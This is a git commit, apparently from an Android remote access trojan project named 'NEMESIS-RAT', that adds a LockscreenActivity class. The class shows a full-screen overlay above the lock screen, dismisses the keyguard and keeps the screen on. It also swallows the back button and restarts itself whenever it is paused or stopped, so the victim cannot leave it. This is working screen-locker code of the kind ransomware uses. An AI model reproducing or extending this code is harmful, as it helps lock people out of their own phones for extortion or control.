1c2b957d2002351fc69dbb44a84bfd4a0de801f0
NEMESIS-RAT <wwkwkk52@gmail.com>
2026-08-11 00:09:19 +0700

    Update LockscreenActivity.java

--- app/src/main/java/com/nemesis/LockscreenActivity.java
+++ app/src/main/java/com/nemesis/LockscreenActivity.java
@@ -1,1 +1,44 @@
+package com.nemesis;
 
+import android.os.Bundle;
+import android.os.Handler;
+import android.view.WindowManager;
+import androidx.appcompat.app.AppCompatActivity;
+
+public class LockscreenActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_lockscreen);
+
+        getWindow().addFlags(
+            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
+            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
+            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
+            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
+            WindowManager.LayoutParams.FLAG_FULLSCREEN
+        );
+
+        getWindow().setType(WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY);
+    }
+
+    @Override
+    public void onBackPressed() {}
+
+    @Override
+    protected void onPause() {
+        super.onPause();
+        new Handler().postDelayed(() -> {
+            finish();
+            startActivity(getIntent());
+        }, 100);
+    }
+
+    @Override
+    protected void onStop() {
+        super.onStop();
+        finish();
+        startActivity(getIntent());
+    }
+}
